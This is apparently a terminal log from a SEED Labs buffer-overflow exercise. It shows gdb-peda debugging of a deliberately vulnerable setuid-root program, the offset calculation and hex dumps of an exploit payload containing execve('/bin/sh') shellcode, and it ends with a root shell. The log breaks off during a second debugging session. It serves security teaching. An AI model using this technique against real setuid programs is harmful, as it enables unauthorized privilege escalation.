[06/17/22]seed@VM:~/.../a1_16$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[06/17/22]seed@VM:~/.../a1_16$ sudo ln -sf /bin/zsh /bin/sh
[06/17/22]seed@VM:~/.../a1_16$ sudo su
root@VM:/home/seed/practice/a1_16# gcc -m32 -o A1 -z execstack -fno-stack-protector A1.c
root@VM:/home/seed/practice/a1_16# sudo chown root A1
root@VM:/home/seed/practice/a1_16# sudo chmod 4755 A1
root@VM:/home/seed/practice/a1_16# su seed
[06/17/22]seed@VM:~/.../a1_16$ 
[06/17/22]seed@VM:~/.../a1_16$ touch badfile
[06/17/22]seed@VM:~/.../a1_16$ gcc  -m32 -o A1_dbg -g -z execstack -fno-stack-protector A1.c
[06/17/22]seed@VM:~/.../a1_16$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b foo
Breakpoint 1 at 0x122d: file A1.c, line 11.
gdb-peda$ run
Starting program: /home/seed/practice/a1_16/A1_dbg 
[----------------------------------registers-----------------------------------]
EAX: 0xffffd378 --> 0x0 
EBX: 0x56558fcc --> 0x3ed4 
ECX: 0xfbad24a8 
EDX: 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd35c --> 0x565562ce (<main+104>:	add    esp,0x10)
EIP: 0x5655622d (<foo>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556224 <frame_dummy+4>:	jmp    0x56556180 <register_tm_clones>
   0x56556229 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x5655622c <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x5655622d <foo>:	endbr32 
   0x56556231 <foo+4>:	push   ebp
   0x56556232 <foo+5>:	mov    ebp,esp
   0x56556234 <foo+7>:	push   ebx
   0x56556235 <foo+8>:	sub    esp,0x234
[------------------------------------stack-------------------------------------]
0000| 0xffffd35c --> 0x565562ce (<main+104>:	add    esp,0x10)
0004| 0xffffd360 --> 0xffffd378 --> 0x0 
0008| 0xffffd364 --> 0x1 
0012| 0xffffd368 --> 0x284 
0016| 0xffffd36c --> 0x5655a1a0 --> 0xfbad2498 
0020| 0xffffd370 --> 0x0 
0024| 0xffffd374 --> 0x0 
0028| 0xffffd378 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, foo (str=0xffffd378 "") at A1.c:11
11	{
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fcc --> 0x3ed4 
EBX: 0x56558fcc --> 0x3ed4 
ECX: 0xfbad24a8 
EDX: 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd358 --> 0xffffd608 --> 0x0 
ESP: 0xffffd120 --> 0xf7fd14f0 --> 0xbc 
EIP: 0x56556245 (<foo+24>:	sub    esp,0x8)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556235 <foo+8>:	sub    esp,0x234
   0x5655623b <foo+14>:	call   0x565562f2 <__x86.get_pc_thunk.ax>
   0x56556240 <foo+19>:	add    eax,0x2d8c
=> 0x56556245 <foo+24>:	sub    esp,0x8
   0x56556248 <foo+27>:	push   DWORD PTR [ebp+0x8]
   0x5655624b <foo+30>:	lea    edx,[ebp-0x229]
   0x56556251 <foo+36>:	push   edx
   0x56556252 <foo+37>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffd120 --> 0xf7fd14f0 --> 0xbc 
0004| 0xffffd124 --> 0x85bdb5ef 
0008| 0xffffd128 --> 0xffffd150 --> 0x5657b008 --> 0x0 
0012| 0xffffd12c --> 0x8 
0016| 0xffffd130 --> 0xf7fb4000 --> 0x1e6d6c 
0020| 0xffffd134 ("\tpUV\016pUV\227}\345\367\tpUV,")
0024| 0xffffd138 --> 0x5655700e --> 0x656c69 ('ile')
0028| 0xffffd13c --> 0xf7e57d97 (<strstr+87>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
16	    strcpy(buffer, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffd358
gdb-peda$ p &buffer
$2 = (char (*)[437]) 0xffffd12f
gdb-peda$ p/d 0xffffd358 - 0xffffd12f
$3 = 553
gdb-peda$ disas foo
Dump of assembler code for function foo:
   0x5655622d <+0>:	endbr32 
   0x56556231 <+4>:	push   ebp
   0x56556232 <+5>:	mov    ebp,esp
   0x56556234 <+7>:	push   ebx
   0x56556235 <+8>:	sub    esp,0x234
   0x5655623b <+14>:	call   0x565562f2 <__x86.get_pc_thunk.ax>
   0x56556240 <+19>:	add    eax,0x2d8c
=> 0x56556245 <+24>:	sub    esp,0x8
   0x56556248 <+27>:	push   DWORD PTR [ebp+0x8]
   0x5655624b <+30>:	lea    edx,[ebp-0x229]
   0x56556251 <+36>:	push   edx
   0x56556252 <+37>:	mov    ebx,eax
   0x56556254 <+39>:	call   0x565560b0 <strcpy@plt>
   0x56556259 <+44>:	add    esp,0x10
   0x5655625c <+47>:	mov    eax,0x1
   0x56556261 <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556264 <+55>:	leave  
   0x56556265 <+56>:	ret    
End of assembler dump.
gdb-peda$ b *0x56556264
Breakpoint 2 at 0x56556264: file A1.c, line 19.
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x56558fcc --> 0x3ed4 
ECX: 0xffffd378 --> 0x0 
EDX: 0xffffd12f --> 0xfb400000 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd358 --> 0xffffd608 --> 0x0 
ESP: 0xffffd120 --> 0xf7fd14f0 --> 0xbc 
EIP: 0x56556264 (<foo+55>:	leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556259 <foo+44>:	add    esp,0x10
   0x5655625c <foo+47>:	mov    eax,0x1
   0x56556261 <foo+52>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x56556264 <foo+55>:	leave  
   0x56556265 <foo+56>:	ret    
   0x56556266 <main>:	endbr32 
   0x5655626a <main+4>:	lea    ecx,[esp+0x4]
   0x5655626e <main+8>:	and    esp,0xfffffff0
[------------------------------------stack-------------------------------------]
0000| 0xffffd120 --> 0xf7fd14f0 --> 0xbc 
0004| 0xffffd124 --> 0x85bdb5ef 
0008| 0xffffd128 --> 0xffffd150 --> 0x5657b008 --> 0x0 
0012| 0xffffd12c --> 0x8 
0016| 0xffffd130 --> 0xf7fb4000 --> 0x1e6d6c 
0020| 0xffffd134 ("\tpUV\016pUV\227}\345\367\tpUV,")
0024| 0xffffd138 --> 0x5655700e --> 0x656c69 ('ile')
0028| 0xffffd13c --> 0xf7e57d97 (<strstr+87>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x56556264 in foo (str=0xffffd378 "") at A1.c:19
19	}
gdb-peda$ p (*(unsigned*)($ebp+4))
$4 = 0x565562ce
gdb-peda$ disas foo
Dump of assembler code for function foo:
   0x5655622d <+0>:	endbr32 
   0x56556231 <+4>:	push   ebp
   0x56556232 <+5>:	mov    ebp,esp
   0x56556234 <+7>:	push   ebx
   0x56556235 <+8>:	sub    esp,0x234
   0x5655623b <+14>:	call   0x565562f2 <__x86.get_pc_thunk.ax>
   0x56556240 <+19>:	add    eax,0x2d8c
   0x56556245 <+24>:	sub    esp,0x8
   0x56556248 <+27>:	push   DWORD PTR [ebp+0x8]
   0x5655624b <+30>:	lea    edx,[ebp-0x229]
   0x56556251 <+36>:	push   edx
   0x56556252 <+37>:	mov    ebx,eax
   0x56556254 <+39>:	call   0x565560b0 <strcpy@plt>
   0x56556259 <+44>:	add    esp,0x10
   0x5655625c <+47>:	mov    eax,0x1
   0x56556261 <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x56556264 <+55>:	leave  
   0x56556265 <+56>:	ret    
End of assembler dump.
gdb-peda$ c
Continuing.
Try Again
[Inferior 1 (process 4583) exited with code 01]
Warning: not running
gdb-peda$ q
[06/17/22]seed@VM:~/.../a1_16$ python3 exploit.py 
[06/17/22]seed@VM:~/.../a1_16$ ./A1
Segmentation fault
[06/17/22]seed@VM:~/.../a1_16$ python3 exploit.py 
0 -- 3 : 0x90 0x90 0x90 0x90
4 -- 7 : 0x90 0x90 0x90 0x90
8 -- 11 : 0x90 0x90 0x90 0x90
12 -- 15 : 0x90 0x90 0x90 0x90
16 -- 19 : 0x90 0x90 0x90 0x90
20 -- 23 : 0x90 0x90 0x90 0x90
24 -- 27 : 0x90 0x90 0x90 0x90
28 -- 31 : 0x90 0x90 0x90 0x90
32 -- 35 : 0x90 0x90 0x90 0x90
36 -- 39 : 0x90 0x90 0x90 0x90
40 -- 43 : 0x90 0x90 0x90 0x90
44 -- 47 : 0x90 0x90 0x90 0x90
48 -- 51 : 0x90 0x90 0x90 0x90
52 -- 55 : 0x90 0x90 0x90 0x90
56 -- 59 : 0x90 0x90 0x90 0x90
60 -- 63 : 0x90 0x90 0x90 0x90
64 -- 67 : 0x31 0xc0 0x50 0x68
68 -- 71 : 0x2f 0x2f 0x73 0x68
72 -- 75 : 0x68 0x2f 0x62 0x69
76 -- 79 : 0x6e 0x89 0xe3 0x50
80 -- 83 : 0x53 0x89 0xe1 0x31
84 -- 87 : 0xd2 0x31 0xc0 0xb0
88 -- 91 : 0xb 0xcd 0x80 0x90
92 -- 95 : 0x90 0x90 0x90 0x90
96 -- 99 : 0x90 0x90 0x90 0x90
100 -- 103 : 0x90 0x90 0x90 0x90
104 -- 107 : 0x90 0x90 0x90 0x90
108 -- 111 : 0x90 0x90 0x90 0x90
112 -- 115 : 0x90 0x90 0x90 0x90
116 -- 119 : 0x90 0x90 0x90 0x90
120 -- 123 : 0x90 0x90 0x90 0x90
124 -- 127 : 0x90 0x90 0x90 0x90
128 -- 131 : 0x90 0x90 0x90 0x90
132 -- 135 : 0x90 0x90 0x90 0x90
136 -- 139 : 0x90 0x90 0x90 0x90
140 -- 143 : 0x90 0x90 0x90 0x90
144 -- 147 : 0x90 0x90 0x90 0x90
148 -- 151 : 0x90 0x90 0x90 0x90
152 -- 155 : 0x90 0x90 0x90 0x90
156 -- 159 : 0x90 0x90 0x90 0x90
160 -- 163 : 0x90 0x90 0x90 0x90
164 -- 167 : 0x90 0x90 0x90 0x90
168 -- 171 : 0x90 0x90 0x90 0x90
172 -- 175 : 0x90 0x90 0x90 0x90
176 -- 179 : 0x90 0x90 0x90 0x90
180 -- 183 : 0x90 0x90 0x90 0x90
184 -- 187 : 0x90 0x90 0x90 0x90
188 -- 191 : 0x90 0x90 0x90 0x90
192 -- 195 : 0x90 0x90 0x90 0x90
196 -- 199 : 0x90 0x90 0x90 0x90
200 -- 203 : 0x90 0x90 0x90 0x90
204 -- 207 : 0x90 0x90 0x90 0x90
208 -- 211 : 0x90 0x90 0x90 0x90
212 -- 215 : 0x90 0x90 0x90 0x90
216 -- 219 : 0x90 0x90 0x90 0x90
220 -- 223 : 0x90 0x90 0x90 0x90
224 -- 227 : 0x90 0x90 0x90 0x90
228 -- 231 : 0x90 0x90 0x90 0x90
232 -- 235 : 0x90 0x90 0x90 0x90
236 -- 239 : 0x90 0x90 0x90 0x90
240 -- 243 : 0x90 0x90 0x90 0x90
244 -- 247 : 0x90 0x90 0x90 0x90
248 -- 251 : 0x90 0x90 0x90 0x90
252 -- 255 : 0x90 0x90 0x90 0x90
256 -- 259 : 0x90 0x90 0x90 0x90
260 -- 263 : 0x90 0x90 0x90 0x90
264 -- 267 : 0x90 0x90 0x90 0x90
268 -- 271 : 0x90 0x90 0x90 0x90
272 -- 275 : 0x90 0x90 0x90 0x90
276 -- 279 : 0x90 0x90 0x90 0x90
280 -- 283 : 0x90 0x90 0x90 0x90
284 -- 287 : 0x90 0x90 0x90 0x90
288 -- 291 : 0x90 0x90 0x90 0x90
292 -- 295 : 0x90 0x90 0x90 0x90
296 -- 299 : 0x90 0x90 0x90 0x90
300 -- 303 : 0x90 0x90 0x90 0x90
304 -- 307 : 0x90 0x90 0x90 0x90
308 -- 311 : 0x90 0x90 0x90 0x90
312 -- 315 : 0x90 0x90 0x90 0x90
316 -- 319 : 0x90 0x90 0x90 0x90
320 -- 323 : 0x90 0x90 0x90 0x90
324 -- 327 : 0x90 0x90 0x90 0x90
328 -- 331 : 0x90 0x90 0x90 0x90
332 -- 335 : 0x90 0x90 0x90 0x90
336 -- 339 : 0x90 0x90 0x90 0x90
340 -- 343 : 0x90 0x90 0x90 0x90
344 -- 347 : 0x90 0x90 0x90 0x90
348 -- 351 : 0x90 0x90 0x90 0x90
352 -- 355 : 0x90 0x90 0x90 0x90
356 -- 359 : 0x90 0x90 0x90 0x90
360 -- 363 : 0x90 0x90 0x90 0x90
364 -- 367 : 0x90 0x90 0x90 0x90
368 -- 371 : 0x90 0x90 0x90 0x90
372 -- 375 : 0x90 0x90 0x90 0x90
376 -- 379 : 0x90 0x90 0x90 0x90
380 -- 383 : 0x90 0x90 0x90 0x90
384 -- 387 : 0x90 0x90 0x90 0x90
388 -- 391 : 0x90 0x90 0x90 0x90
392 -- 395 : 0x90 0x90 0x90 0x90
396 -- 399 : 0x90 0x90 0x90 0x90
400 -- 403 : 0x90 0x90 0x90 0x90
404 -- 407 : 0x90 0x90 0x90 0x90
408 -- 411 : 0x90 0x90 0x90 0x90
412 -- 415 : 0x90 0x90 0x90 0x90
416 -- 419 : 0x90 0x90 0x90 0x90
420 -- 423 : 0x90 0x90 0x90 0x90
424 -- 427 : 0x90 0x90 0x90 0x90
428 -- 431 : 0x90 0x90 0x90 0x90
432 -- 435 : 0x90 0x90 0x90 0x90
436 -- 439 : 0x90 0x90 0x90 0x90
440 -- 443 : 0x90 0x90 0x90 0x90
444 -- 447 : 0x90 0x90 0x90 0x90
448 -- 451 : 0x90 0x90 0x90 0x90
452 -- 455 : 0x90 0x90 0x90 0x90
456 -- 459 : 0x90 0x90 0x90 0x90
460 -- 463 : 0x90 0x90 0x90 0x90
464 -- 467 : 0x90 0x90 0x90 0x90
468 -- 471 : 0x90 0x90 0x90 0x90
472 -- 475 : 0x90 0x90 0x90 0x90
476 -- 479 : 0x90 0x90 0x90 0x90
480 -- 483 : 0x90 0x90 0x90 0x90
484 -- 487 : 0x90 0x90 0x90 0x90
488 -- 491 : 0x90 0x90 0x90 0x90
492 -- 495 : 0x90 0x90 0x90 0x90
496 -- 499 : 0x90 0x90 0x90 0x90
500 -- 503 : 0x90 0x90 0x90 0x90
504 -- 507 : 0x90 0x90 0x90 0x90
508 -- 511 : 0x90 0x90 0x90 0x90
512 -- 515 : 0x90 0x90 0x90 0x90
516 -- 519 : 0x90 0x90 0x90 0x90
520 -- 523 : 0x90 0x90 0x90 0x90
524 -- 527 : 0x90 0x90 0x90 0x90
528 -- 531 : 0x90 0x90 0x90 0x90
532 -- 535 : 0x90 0x90 0x90 0x90
536 -- 539 : 0x90 0x90 0x90 0x90
540 -- 543 : 0x90 0x90 0x90 0x90
544 -- 547 : 0x90 0x90 0x90 0x90
548 -- 551 : 0x90 0x90 0x90 0x90
552 -- 555 : 0x90 0x90 0x90 0x90
556 -- 559 : 0x90 0x2f 0xd1 0xff
560 -- 563 : 0xff 0x90 0x90 0x90
564 -- 567 : 0x90 0x90 0x90 0x90
568 -- 571 : 0x90 0x90 0x90 0x90
572 -- 575 : 0x90 0x90 0x90 0x90
576 -- 579 : 0x90 0x90 0x90 0x90
580 -- 583 : 0x90 0x90 0x90 0x90
584 -- 587 : 0x90 0x90 0x90 0x90
588 -- 591 : 0x90 0x90 0x90 0x90
592 -- 595 : 0x90 0x90 0x90 0x90
596 -- 599 : 0x90 0x90 0x90 0x90
600 -- 603 : 0x90 0x90 0x90 0x90
604 -- 607 : 0x90 0x90 0x90 0x90
608 -- 611 : 0x90 0x90 0x90 0x90
612 -- 615 : 0x90 0x90 0x90 0x90
616 -- 619 : 0x90 0x90 0x90 0x90
620 -- 623 : 0x90 0x90 0x90 0x90
624 -- 627 : 0x90 0x90 0x90 0x90
628 -- 631 : 0x90 0x90 0x90 0x90
632 -- 635 : 0x90 0x90 0x90 0x90
636 -- 639 : 0x90 0x90 0x90 0x90
640 -- 643 : 0x90 0x90 0x90 0x90
[06/17/22]seed@VM:~/.../a1_16$ python3 exploit.py 
0 -- 3 : 0x90 0x90 0x90 0x90
4 -- 7 : 0x90 0x90 0x90 0x90
8 -- 11 : 0x90 0x90 0x90 0x90
12 -- 15 : 0x90 0x90 0x90 0x90
16 -- 19 : 0x90 0x90 0x90 0x90
20 -- 23 : 0x90 0x90 0x90 0x90
24 -- 27 : 0x90 0x90 0x90 0x90
28 -- 31 : 0x90 0x90 0x90 0x90
32 -- 35 : 0x90 0x90 0x90 0x90
36 -- 39 : 0x90 0x90 0x90 0x90
40 -- 43 : 0x90 0x90 0x90 0x90
44 -- 47 : 0x90 0x90 0x90 0x90
48 -- 51 : 0x90 0x90 0x90 0x90
52 -- 55 : 0x90 0x90 0x90 0x90
56 -- 59 : 0x90 0x90 0x90 0x90
60 -- 63 : 0x90 0x90 0x90 0x90
64 -- 67 : 0x31 0xc0 0x50 0x68
68 -- 71 : 0x2f 0x2f 0x73 0x68
72 -- 75 : 0x68 0x2f 0x62 0x69
76 -- 79 : 0x6e 0x89 0xe3 0x50
80 -- 83 : 0x53 0x89 0xe1 0x31
84 -- 87 : 0xd2 0x31 0xc0 0xb0
88 -- 91 : 0xb 0xcd 0x80 0x90
92 -- 95 : 0x90 0x90 0x90 0x90
96 -- 99 : 0x90 0x90 0x90 0x90
100 -- 103 : 0x90 0x90 0x90 0x90
104 -- 107 : 0x90 0x90 0x90 0x90
108 -- 111 : 0x90 0x90 0x90 0x90
112 -- 115 : 0x90 0x90 0x90 0x90
116 -- 119 : 0x90 0x90 0x90 0x90
120 -- 123 : 0x90 0x90 0x90 0x90
124 -- 127 : 0x90 0x90 0x90 0x90
128 -- 131 : 0x90 0x90 0x90 0x90
132 -- 135 : 0x90 0x90 0x90 0x90
136 -- 139 : 0x90 0x90 0x90 0x90
140 -- 143 : 0x90 0x90 0x90 0x90
144 -- 147 : 0x90 0x90 0x90 0x90
148 -- 151 : 0x90 0x90 0x90 0x90
152 -- 155 : 0x90 0x90 0x90 0x90
156 -- 159 : 0x90 0x90 0x90 0x90
160 -- 163 : 0x90 0x90 0x90 0x90
164 -- 167 : 0x90 0x90 0x90 0x90
168 -- 171 : 0x90 0x90 0x90 0x90
172 -- 175 : 0x90 0x90 0x90 0x90
176 -- 179 : 0x90 0x90 0x90 0x90
180 -- 183 : 0x90 0x90 0x90 0x90
184 -- 187 : 0x90 0x90 0x90 0x90
188 -- 191 : 0x90 0x90 0x90 0x90
192 -- 195 : 0x90 0x90 0x90 0x90
196 -- 199 : 0x90 0x90 0x90 0x90
200 -- 203 : 0x90 0x90 0x90 0x90
204 -- 207 : 0x90 0x90 0x90 0x90
208 -- 211 : 0x90 0x90 0x90 0x90
212 -- 215 : 0x90 0x90 0x90 0x90
216 -- 219 : 0x90 0x90 0x90 0x90
220 -- 223 : 0x90 0x90 0x90 0x90
224 -- 227 : 0x90 0x90 0x90 0x90
228 -- 231 : 0x90 0x90 0x90 0x90
232 -- 235 : 0x90 0x90 0x90 0x90
236 -- 239 : 0x90 0x90 0x90 0x90
240 -- 243 : 0x90 0x90 0x90 0x90
244 -- 247 : 0x90 0x90 0x90 0x90
248 -- 251 : 0x90 0x90 0x90 0x90
252 -- 255 : 0x90 0x90 0x90 0x90
256 -- 259 : 0x90 0x90 0x90 0x90
260 -- 263 : 0x90 0x90 0x90 0x90
264 -- 267 : 0x90 0x90 0x90 0x90
268 -- 271 : 0x90 0x90 0x90 0x90
272 -- 275 : 0x90 0x90 0x90 0x90
276 -- 279 : 0x90 0x90 0x90 0x90
280 -- 283 : 0x90 0x90 0x90 0x90
284 -- 287 : 0x90 0x90 0x90 0x90
288 -- 291 : 0x90 0x90 0x90 0x90
292 -- 295 : 0x90 0x90 0x90 0x90
296 -- 299 : 0x90 0x90 0x90 0x90
300 -- 303 : 0x90 0x90 0x90 0x90
304 -- 307 : 0x90 0x90 0x90 0x90
308 -- 311 : 0x90 0x90 0x90 0x90
312 -- 315 : 0x90 0x90 0x90 0x90
316 -- 319 : 0x90 0x90 0x90 0x90
320 -- 323 : 0x90 0x90 0x90 0x90
324 -- 327 : 0x90 0x90 0x90 0x90
328 -- 331 : 0x90 0x90 0x90 0x90
332 -- 335 : 0x90 0x90 0x90 0x90
336 -- 339 : 0x90 0x90 0x90 0x90
340 -- 343 : 0x90 0x90 0x90 0x90
344 -- 347 : 0x90 0x90 0x90 0x90
348 -- 351 : 0x90 0x90 0x90 0x90
352 -- 355 : 0x90 0x90 0x90 0x90
356 -- 359 : 0x90 0x90 0x90 0x90
360 -- 363 : 0x90 0x90 0x90 0x90
364 -- 367 : 0x90 0x90 0x90 0x90
368 -- 371 : 0x90 0x90 0x90 0x90
372 -- 375 : 0x90 0x90 0x90 0x90
376 -- 379 : 0x90 0x90 0x90 0x90
380 -- 383 : 0x90 0x90 0x90 0x90
384 -- 387 : 0x90 0x90 0x90 0x90
388 -- 391 : 0x90 0x90 0x90 0x90
392 -- 395 : 0x90 0x90 0x90 0x90
396 -- 399 : 0x90 0x90 0x90 0x90
400 -- 403 : 0x90 0x90 0x90 0x90
404 -- 407 : 0x90 0x90 0x90 0x90
408 -- 411 : 0x90 0x90 0x90 0x90
412 -- 415 : 0x90 0x90 0x90 0x90
416 -- 419 : 0x90 0x90 0x90 0x90
420 -- 423 : 0x90 0x90 0x90 0x90
424 -- 427 : 0x90 0x90 0x90 0x90
428 -- 431 : 0x90 0x90 0x90 0x90
432 -- 435 : 0x90 0x90 0x90 0x90
436 -- 439 : 0x90 0x90 0x90 0x90
440 -- 443 : 0x90 0x90 0x90 0x90
444 -- 447 : 0x90 0x90 0x90 0x90
448 -- 451 : 0x90 0x90 0x90 0x90
452 -- 455 : 0x90 0x90 0x90 0x90
456 -- 459 : 0x90 0x90 0x90 0x90
460 -- 463 : 0x90 0x90 0x90 0x90
464 -- 467 : 0x90 0x90 0x90 0x90
468 -- 471 : 0x90 0x90 0x90 0x90
472 -- 475 : 0x90 0x90 0x90 0x90
476 -- 479 : 0x90 0x90 0x90 0x90
480 -- 483 : 0x90 0x90 0x90 0x90
484 -- 487 : 0x90 0x90 0x90 0x90
488 -- 491 : 0x90 0x90 0x90 0x90
492 -- 495 : 0x90 0x90 0x90 0x90
496 -- 499 : 0x90 0x90 0x90 0x90
500 -- 503 : 0x90 0x90 0x90 0x90
504 -- 507 : 0x90 0x90 0x90 0x90
508 -- 511 : 0x90 0x90 0x90 0x90
512 -- 515 : 0x90 0x90 0x90 0x90
516 -- 519 : 0x90 0x90 0x90 0x90
520 -- 523 : 0x90 0x90 0x90 0x90
524 -- 527 : 0x90 0x90 0x90 0x90
528 -- 531 : 0x90 0x90 0x90 0x90
532 -- 535 : 0x90 0x90 0x90 0x90
536 -- 539 : 0x90 0x90 0x90 0x90
540 -- 543 : 0x90 0x90 0x90 0x90
544 -- 547 : 0x90 0x90 0x90 0x90
548 -- 551 : 0x90 0x90 0x90 0x90
552 -- 555 : 0x90 0x90 0x90 0x90
556 -- 559 : 0x90 0x48 0xd1 0xff
560 -- 563 : 0xff 0x90 0x90 0x90
564 -- 567 : 0x90 0x90 0x90 0x90
568 -- 571 : 0x90 0x90 0x90 0x90
572 -- 575 : 0x90 0x90 0x90 0x90
576 -- 579 : 0x90 0x90 0x90 0x90
580 -- 583 : 0x90 0x90 0x90 0x90
584 -- 587 : 0x90 0x90 0x90 0x90
588 -- 591 : 0x90 0x90 0x90 0x90
592 -- 595 : 0x90 0x90 0x90 0x90
596 -- 599 : 0x90 0x90 0x90 0x90
600 -- 603 : 0x90 0x90 0x90 0x90
604 -- 607 : 0x90 0x90 0x90 0x90
608 -- 611 : 0x90 0x90 0x90 0x90
612 -- 615 : 0x90 0x90 0x90 0x90
616 -- 619 : 0x90 0x90 0x90 0x90
620 -- 623 : 0x90 0x90 0x90 0x90
624 -- 627 : 0x90 0x90 0x90 0x90
628 -- 631 : 0x90 0x90 0x90 0x90
632 -- 635 : 0x90 0x90 0x90 0x90
636 -- 639 : 0x90 0x90 0x90 0x90
640 -- 643 : 0x90 0x90 0x90 0x90
[06/17/22]seed@VM:~/.../a1_16$ ./A1
Segmentation fault
[06/17/22]seed@VM:~/.../a1_16$ python3 exploit.py 
[06/17/22]seed@VM:~/.../a1_16$ ./A1
# whoami                                                                       
root
# exit                                                                         
[06/17/22]seed@VM:~/.../a1_16$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b foo
Breakpoint 1 at 0x122d: file A1.c, line 11.
gdb-peda$ run
Starting program: /home/seed/practice/a1_16/A1_dbg 
[----------------------------------registers-----------------------------------]
EAX: 0xffffd378 --> 0x90909090 
EBX: 0x56558fcc --> 0x3ed4 
ECX: 0x0 
EDX: 0x284 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd35c --> 0x565562ce (<main+104>:	add    esp,0x10)
EIP: 0x5655622d (<foo>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556224 <frame_dummy+4>:	jmp    0x56556180 <register_tm_clones>
   0x56556229 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x5655622c <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x5655622d <foo>:	endbr32 
   0x56556231 <foo+4>:	push   ebp
   0x56556232 <foo+5>:	mov    ebp,esp
   0x56556234 <foo+7>:	push   ebx
   0x56556235 <foo+8>:	sub    esp,0x234
[------------------------------------stack-------------------------------------]
0000| 0xffffd35c --> 0x565562ce (<main+104>:	add    esp,0x10)
0004| 0xffffd360 --> 0xffffd378 --> 0x90909090 
0008| 0xffffd364 --> 0x1 
0012| 0xffffd368 --> 0x284 
0016| 0xffffd36c --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffd370 --> 0x0 
0024| 0xffffd374 --> 0x0 
0028| 0xffffd378 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, foo (
    str=0xffffd378 '\220' <repeats 64 times>, "\061\300Ph//shh/bin\211\343PS\211\341\061\322\061\300\260\v̀", '\220' <repeats 109 times>...) at A1.c:11
11	{
gdb-peda$ disas foo
Dump of assembler code for function foo:
=> 0x5655622d <+0>:	endbr32 
   0x56556231 <+4>:	push   ebp
   0x56556232 <+5>:	mov    ebp,esp
   0x56556234 <+7>:	push   ebx
   0x56556235 <+8>:	sub    esp,0x234
   0x5655623b <+14>:	call   0x565562f2 <__x86.get_pc_thunk.ax>
   0x56556240 <+19>:	add    eax,0x2d8c
   0x56556245 <+24>:	sub    esp,0x8
   0x56556248 <+27>:	push   DWORD PTR [ebp+0x8]
   0x5655624b <+30>:	lea    edx,[ebp-0x229]
   0x56556251 <+36>:	push   edx
   0x56556252 <+37>:	mov    ebx,eax
   0x56556254 <+39>:	call   0x565560b0 <strcpy@plt>
   0x56556259 <+44>:	add    esp,0x10
   0x5655625c <+47>:	mov    eax,0x1
   0x56556261 <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556264 <+55>:	leave  
   0x56556265 <+56>:	ret    
End of assembler dump.
gdb-peda$ b *0x56556264
Breakpoint 2 at 0x56556264: file A1.c, line 19.
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x90909090 
